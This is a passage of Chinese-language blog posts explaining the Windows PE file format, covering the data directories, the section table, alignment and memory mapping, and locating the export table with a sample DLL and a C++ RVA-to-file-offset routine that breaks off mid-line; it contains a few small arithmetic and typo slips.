<li><p><strong>IMAGE_DATA_DIRECTORY [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</strong></p>
<p>这个字段可以说是最重要的字段之一，他由16个相同的IMAGE_DATA_DIRECTORY结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但这些处于各个节中的数据按照用途可以分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。IMAGE_DATA_DIRECTORY 结构定义比较简单，它仅仅指出了某种数据块的长度和位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">//数据的相对虚拟地址(RVA)</span></span><br><span class="line">    DWORD Size; <span class="comment">//数据的大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>各个数据目录列表的含义：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012204106567.png" alt="image-20211012204106567"></p>
<p>在PE文件中找寻特定的数据时就是从这些IMAGE_DATA_DIRECTORY结构开始的，比如要存取资源，那么就必须从第三个IMAGE_DATA_DIRECTORY结构（索引为2）中获得资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的那些API函数，那就必须首先从第二个IMAGE_DATA_DIRECTORY结构得到导入表的位置与大小。</p>
<h3 id="IMAGE-SECTION-HEADER结构"><a href="#IMAGE-SECTION-HEADER结构" class="headerlink" title="IMAGE_SECTION_HEADER结构"></a>IMAGE_SECTION_HEADER结构</h3><p>区块表（节表）：</p>
<p>PE文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来 描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的IMAGE_SECTION_HEADER结构作为 结束，所以节表中总的IMAGE_SECTION_HEADER结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。<br>另外，节表中 IMAGE_SECTION_HEADER 结构的总数总是由PE文件头 IMAGE_NT_HEADERS 结构中的 FileHeader.NumberOfSections 字段来指定的。</p>
<p>此结构体共占40个字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">+<span class="number">0</span>h BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 节表名称,如“.text” </span></span><br><span class="line"><span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">+8<span class="title">h</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress; <span class="comment">// 物理地址</span></span><br><span class="line">DWORD VirtualSize; <span class="comment">// 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一</span></span><br><span class="line"><span class="comment">// 般是取后一个</span></span><br><span class="line">&#125; Misc;</span><br><span class="line">+ch DWORD VirtualAddress; <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">+<span class="number">10</span>h DWORD SizeOfRawData; <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">+<span class="number">14</span>h DWORD PointerToRawData; <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">+<span class="number">18</span>h DWORD PointerToRelocations; <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">+<span class="number">1</span>ch DWORD PointerToLinenumbers; <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">+<span class="number">1</span>eh WORD NumberOfRelocations; <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">+<span class="number">20</span>h WORD NumberOfLinenumbers; <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">+<span class="number">24</span>h DWORD Characteristics; <span class="comment">// 节属性如可读，可写，可执行等&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span></span><br></pre></td></tr></table></figure>

<p><strong>Name： 区块名</strong>。这是一个由8位的ASCII  码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：.text），这个“.”  实际上是不是必须的。值得我们注意的是，如果区块名超过 8 个字节，则没有最后的终止标志“NULL” 字节。并且前边带有一个“$”  的区块名字会从连接器那里得到特殊的待遇，前边带有“$” 的相同名字的区块在载入时候将会被合并，在合并之后的区块中，他们是按照“$”  后边的字符的字母顺序进行合并的。<br>另外每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，他的存在仅仅是为了正 规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data” 或者说将包含数据的区块命名为“.Code”  都是合法的。当我们要从PE 文件中读取需要的区块时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照  IMAGE_OPTIONAL_HEADER32 结构中的数据目录字段结合进行定位。</p>
<ul>
<li><strong>Virtual Size:</strong> 该表对应的区块大小，这是区块的数据在没有进行对齐处理前的实际大小</li>
<li><strong>Virtual address:</strong> <strong>该区块装载到内存中的RVA 地址</strong>。这个地址是按照内存页来对齐的，因此它的数值总是 SectionAlignment  的值的整数倍。在Microsoft 工具中，第一个快的默认 RVA 总为1000h。在OBJ 中，该字段没有意义地，并被设为0。</li>
<li><strong>SizeOfRawData:</strong> 该区块在磁盘中所占的大小。在可执行文件中，该字段的大小是已经被FileAlignment进行对齐过的长度。(FileAlignment 是磁盘中PE文件对齐标准的字段，默认大小为200h，SectionAlignment 是内存中PE文件对齐标准的字段，默认大小为1000h )</li>
<li><strong>PointerToRawData: 该区块在磁盘中的偏移。</strong> 这个数值是从文件头开始算起的偏移量 </li>
<li><strong>PointerToRelocations：</strong>这哥们在EXE文件中没有意义，<strong>在OBJ 文件中，表示本区块重定位信息的偏移值</strong>。（在OBJ 文件中如果不是零，它会指向一个IMAGE_RELOCATION 结构的数组）</li>
<li><strong>PointerToLinenumbers：行号表在文件中的偏移值</strong>，文件的调试信息，于我们没用，鸡肋。</li>
<li><strong>NumberOfRelocations：</strong>这哥们在EXE文件中也没有意义，<strong>在OBJ 文件中，是本区块在重定位表中的重定位数目</strong>来着。</li>
<li><strong>Characteristics：该区块的属性</strong>。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。</li>
</ul>
<h3 id="区块描述、对齐值以及RVA详解"><a href="#区块描述、对齐值以及RVA详解" class="headerlink" title="区块描述、对齐值以及RVA详解"></a>区块描述、对齐值以及RVA详解</h3><p>通常，区块中的数据在逻辑上是关联的。PE  文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫.rdata，表明他是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。  </p>
<p>  另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。  </p>
<p>  <strong>下表中的区块名称以及意义：</strong>  </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/634_82c_216.jpg" alt="634_82c_216"></p>
<p> 我们再Visual C++ 中也可以自己命名区块，用#pragma来声明， 告诉编译器插入数据到一个区块中，格式如下：</p>
<p>​    <strong>#pragma data_msg(“FC_data”)</strong></p>
<p>以上语句告诉编译器将数据全都放入”FC-data” 的区块中，而不是默认的.data区块内。区块一般是从obj文件开始，被编译器防止。链接器用于合并OBJ和库中需要的块，使其称为一个最终合适的区块。链接器会遵循一套相当完整的规则，他会判断哪些区块将被合并以及如何被合并。</p>
<p><strong>合并区块：</strong> 链接器可以合并区块。如果两个区块有相似、一致性的属性，那么他们在链接的时候能够被合并成一个单一的区块。这取决于编译器是否开启了/merge开关。由于区块存在对齐问题，如果PE文件中存在大量相似的区块而不进行合并，这样会对内存资源造成极大的浪费 *<em>注意：（我们不可以将.rsrc、.reloc、.pdata 合并到</em>***的区块中。</p>
<p>之前我们简单了解过区块是要对齐的，无论是在内存中存放还是在磁盘中存放~  但他们一般的对齐值是不同的。</p>
<p> PE 文件头里边的FileAligment 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h 来填充，这就是区块间的间隙。</p>
<p><strong>区块的对齐值</strong></p>
<p> 例如，在PE文件中，一个典型的对齐值是200h ，这样，每个区块都将从200h 的倍数的文件偏移位置开始，假设第一个区块在400h  处，长度为90h，那么从文件400h 到490h  为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为FileAlignment 的整数倍，490h 到 600h  这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。</p>
<p> PE 文件头里边的SectionAligment 定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。</p>
<p> 一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64 上，是按8KB（2000h）来排列的。所以在X86 系统中，PE文件区块的内存对齐值一般等于 1000h，每个区块按1000h 的倍数在内存中存放。</p>
<h3 id="PE文件到内存的映射"><a href="#PE文件到内存的映射" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h3><h3 id="PE文件到内存的映射-1"><a href="#PE文件到内存的映射-1" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h3><ul>
<li>在执行一个PE文件的时候，Windows并不是在一开始就将整个文件读入内存的，而是采用与内存映射文件类似的机制但又不完全相同；内存映射所写入物理内存中的文件与磁盘文件相比，相对位置完全相同，而Windows装载器装载的EXE等文件时，会产生重定位对某些数据进行预处理，装载到物理内存等待系统使用，使得磁盘文件与物理内存文件的相对位置不同。</li>
<li>也就是Windows装载器在装载的时候仅仅建立好了虚拟地址与PE文件之间的映射关系，与我上文写的一致。</li>
<li>当且仅当真正执行至某个内存页中的指令或访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存之中，这种机制使得文件装入的速度和文件的大小并没有太大关系，而是与CPU关系大。</li>
<li>Windows装载器在装载DOS部分、PE文件头部分和区块表（节表）部分是不进行任何特殊处理的，而在装载节（区块）的时候则会自动对照区块表（节表）的属性做不同的处理</li>
<li>一般情况下，它会处理以下几个方面的内容：<ul>
<li>内存页的属性;</li>
<li>节的偏移地址;</li>
<li>节的尺寸;</li>
<li>不进行映射的节;</li>
</ul>
</li>
</ul>
<p><strong>内存页的属性</strong>：</p>
<p>对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性来设置的。但是在装载可执行文件的时候，与节对应的内存页属性需要按照节的属性来设置。所以在同属于一个模块的内存页中，从不同节映射来的内存页的属性是不同的。</p>
<p><strong>节的偏移地址：</strong></p>
<p>节的起始地址在磁盘文件中是按照IMAGE_OPTIONAL_HEADER32结构的 FileAlignment 字段的值进行对齐，而当被加载到内存中时是按照同一结构的SectionAlignment 字段的值对齐的，两者的值可能不同，所以当一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p>
<p>这就是为什么PE文件在载入虚拟空间地址后偏移地址会发生比例改变的原因。</p>
<p>注意：<strong>节实际上就是相同属性数据的组合</strong> 当节被装入内存中时，相同一个内存所对应的内存页都将被赋予相同的页属性，实际上，windows系统对内存属性的设置时以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小。</p>
<p><strong>对于32位操作系统来说，这个值一般是4KB==1000H; 对于64位操作系统这个值一般是8KB==2000H）</strong></p>
<p><strong>当我们需要从PE文件中读取区块的时候，不能以区块的名称作为定位的标准或依据，正确的方法是按照IMAGE_OPTIONAL_HEADER32结构中的数据目录字段进行定位</strong></p>
<h2 id="实际操作展示"><a href="#实际操作展示" class="headerlink" title="实际操作展示"></a>实际操作展示</h2><h3 id="利用IMAGE-DOS-HEADER进行跳转"><a href="#利用IMAGE-DOS-HEADER进行跳转" class="headerlink" title="利用IMAGE_DOS_HEADER进行跳转"></a>利用IMAGE_DOS_HEADER进行跳转</h3><p>e_magic变量的值为0X4D5A 对应的MZ 即为DOS头部的标示，DOS可执行文件标示。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012120145749.png" alt="image-20211012120145749"></p>
<p>利用e_lfanew使pe文件由DOS头位置跳转至PE文件头位置。</p>
<p>e_lfanew处的偏移量由于应该是高位地址在前，低位地址在后，顺序应颠倒-&gt;00 00 01 40 即 140h 此处偏移地址是根据基地址来看，因此应该是00 00 00 00 + 00 00 01 40 = 00 00 01 40</p>
<p>根据偏移地址可以找到140h 即为PE文件头的起始偏移量，加上基地址就可找到PE文件头的指针，来到PE文件头</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012120542254.png" alt="image-20211012120542254"></p>
<h3 id="找出IMAGE-NT-HEADERS中IMAGE-OPTIONAL-HEADER32的地址"><a href="#找出IMAGE-NT-HEADERS中IMAGE-OPTIONAL-HEADER32的地址" class="headerlink" title="找出IMAGE_NT_HEADERS中IMAGE_OPTIONAL_HEADER32的地址"></a>找出IMAGE_NT_HEADERS中IMAGE_OPTIONAL_HEADER32的地址</h3><p>利用IMAGE_FILE_HEADER结构中SizeOfOptionalHeader（+14h）找出IMAGE_OPTIONAL_HEADER32结构的大小。</p>
<p>根据PE头+14h可找到SizeOFoptionHeader的值0X00F0，转化为10进制可得出IMAGE_OPTIONAL_HEADER32结构大小为240</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013095656163.png" alt="image-20211013095656163"></p>
<p>其次，根据IMAGE_NT_HEADERS结构体的IMAGE_OPTIONAL_HEADER32（+18h）拿到IMAGE_OPTIONAL_HEADER32的起始地址</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013095854695.png" alt="image-20211013095854695"></p>
<p>利用起始地址+结构大小=整个结构 可知，IMAGE_OPTIONAL_HEADER32的结构的起始地址为158h结束地址为248h 第一次算没把158当成16进制，直接算错了(笑)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013100616071.png" alt="image-20211013100616071"></p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-导出表(3)</title>
    <url>/2021/10/14/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8(3)/</url>
    <content><![CDATA[<h1 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a><strong>导出表</strong></h1><h4 id="导出表的作用"><a href="#导出表的作用" class="headerlink" title="导出表的作用"></a><strong>导出表的作用</strong></h4><p>一个可执行程序是由<strong>多个PE文件</strong>构成的</p>
<p>利用EverEdit.exe为例，查看运行他所需的所有模块</p>
<p>使用od载入程序，利用<em>e</em>查看载入的模块（dll与exe程序，PE文件载入内存后可称作模块）</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112208833.png" alt="image-20211015112208833"></p>
<p>我们可以看出，该程序除了载入自身exe程序外，还在外部动态链接了大量dll文件，这些dll为程序提供了运行所需的一些函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>

<p>就比如MessageBoxA的弹窗函数就是由User32.dll模块提供</p>
<p>以上的每个模块都发挥着其作用，使得程序得以正常运行</p>
<p>一个程序引用哪些模块是由<strong>其导入表</strong>决定的</p>
<p>与导入表相对应的便是<strong>导出表</strong>，导出表则是决定当前PE文件<strong>能给其他PE文件提供的函数</strong></p>
<p>拿User32.dll举例，它的导出表结构中，一定包含着MessageBoxA这个函数,否则它不可能提供这个函数给程序。</p>
<hr>
<p><strong>导入表与导出表概念总结</strong>:</p>
<ul>
<li>导出表:设置本PE文件可以将什么函数提供给其他PE文件</li>
<li>导入表:该PE文件可以使用哪些PE文件。</li>
</ul>
<p><strong>个人理解</strong>，PE文件中的导入表像是C/C++中的#include <xxx> 包含另一个文件来使用其中的函数，导出表便是其头文件，可使用的函数便是头文件中所声明的函数那般。</xxx></p>
<h2 id="何为导出表？"><a href="#何为导出表？" class="headerlink" title="何为导出表？"></a>何为导出表？</h2><p>导出表便是记录该PE文件提供给其他PE文件的函数的一种结构</p>
<h3 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h3><h4 id="定位导出表的原理"><a href="#定位导出表的原理" class="headerlink" title="定位导出表的原理"></a>定位导出表的原理</h4><p>导出表的定位可以利用PE文件_IMAGE_OPTIONAL_HEADER32中的DataDirectory结构进行定位。</p>
<p>DataDirecoty是一个长为16的数组，<strong>每个数组成员对应一个表</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">成员										数据宽度</span><br><span class="line"></span><br><span class="line">DataDirectory[<span class="number">16</span>] 	IMAGE_DATA_DIRECTORY[<span class="number">16</span>]=<span class="number">128</span>字节</span><br></pre></td></tr></table></figure>

<p>数据目录中共有16个表</p>
<p>根据表的结构可知，导出表的下标为0</p>
<p>即DataDirectory[0]表示导出表</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014165215769.png" alt="image-20211014165215769"></p>
<p>根据c语言中，该成员在扩展PE头中的定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br></pre></td></tr></table></figure>

<p>可以看到数组成员的结构为IMAGE_DATA_DIRECTORY</p>
<p><strong>IMAGE_DATA_DIRECTORY</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>

<p>这样的结构于扩展PE头内有15个</p>
<table>
<thead>
<tr>
<th>IMAGE_DATA_DIRECTORY成员</th>
<th>数据宽度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>DWORD(4字节)</td>
<td>表的起始位置（RVA）</td>
</tr>
<tr>
<td>Size</td>
<td>DWORD(4字节)</td>
<td>表的大小</td>
</tr>
</tbody></table>
<p>VirtualAddress 意为一个相对虚拟地址(RVA)</p>
<p>Size： 表的大小</p>
<p>根据VirtualAddress 与 Size 可求出该表的范围。</p>
<p>同时，IMAGE_DATA_DIRECTORY<strong>仅仅记录表的位置和大小，没有描述表的具体结构</strong></p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>1.找到IMAGE_OPTIONAL_HEADER32的最后一个成员DataDirectory</p>
<p>2.获取DataDirectory[0]</p>
<p>3.根据DataDirectory[0].virtualAddress得到导出表的RVA</p>
<p>4.将导出表的RVA转换为FOA，利用16进制编辑器定位导出表</p>
<p>RVA = 区块.VirtualAddress + 差值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### RVA 转 FOA 计算方式</span><br><span class="line"></span><br><span class="line">若RVA不在PE头内:</span><br><span class="line"></span><br><span class="line">差值 = RVA - 区块.VirtualAddress</span><br><span class="line"></span><br><span class="line">FOA = 区块.PointerToRawData + 差值</span><br><span class="line"></span><br><span class="line">若在PE头内:</span><br><span class="line"></span><br><span class="line">RVA = FOA</span><br></pre></td></tr></table></figure>

<p><strong>分析实例</strong></p>
<p>以lyl610abc师傅于文中公布的dll文件为例，进行调试</p>
<p>导出函数的声明定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Add @<span class="number">12</span> </span><br><span class="line">Sub @<span class="number">15</span> NONAME</span><br><span class="line">Multiply @<span class="number">17</span></span><br><span class="line">Divide @<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>具体导出函数定义</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Multiply</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x * y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">Divide</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x / y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到DataDirectory"><a href="#找到DataDirectory" class="headerlink" title="找到DataDirectory"></a>找到DataDirectory</h4><p>由于DataDirectory数据目录本身在PE头的扩展头部分，因此我们需要先获取到PE头的起始位，再根据IMAGE_NT_HEADERS结构的PE文件头标志大小+标准PE头大小达到扩展PE头：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014191938589.png" alt="image-20211014191938589"></p>
<p>演示DLL文件为PE32文件，因此PE格式的标准头文件为 IMAGE_NT_HEADERS：</p>
<p>扩展PE头首地址:0xF8+0x4+0x14(20) = 0x110</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014192704811.png" alt="image-20211014192704811"></p>
<p>同时扩展PE头大小为224 字节，数据目录(DATADirectory大小) = _IMAGE_DATA_DIRECTORY大小*16 = 8 *16 = 128</p>
<p>因此224 - 128 = 96个字节</p>
<p>因此扩展PE头起始地址+ 96字节后为DataDirectory结构的起始地址</p>
<p>DataDirectory起始地址 = 扩展头地址+ 0x60(96) = 0x110 + 0x60 = 0x110 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211014195234440.png" alt="image-20211014195234440"></p>
<p>由此拿到DataDirectory，顺序排放DataDirectory[0] ~ DataDirectory[15] 8字节一张表</p>
<p>DataDirectory[0] 对应着导出表</p>
<table>
<thead>
<tr>
<th>IMAGE_DATA_DIRECTORY成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>0x00018FB0</td>
<td>表的起始位置（RVA）</td>
</tr>
<tr>
<td>Size</td>
<td>0x00000190</td>
<td>表的大小</td>
</tr>
</tbody></table>
<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>根据结构拿到导出表<strong>RVA</strong>值为: 0x018FB0</p>
<p>导出表的<strong>size</strong>为: 0x0190</p>
<h4 id="RVA转换FOA"><a href="#RVA转换FOA" class="headerlink" title="RVA转换FOA"></a><strong>RVA转换FOA</strong></h4><p>但是IMAGE_DATA_DIRECTORY中的VirtualAddress 是RVA它在内存中才有的用， 在磁盘文件下需要将其转换成FOA</p>
<p>直接利用代码获取对应的FOA:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span 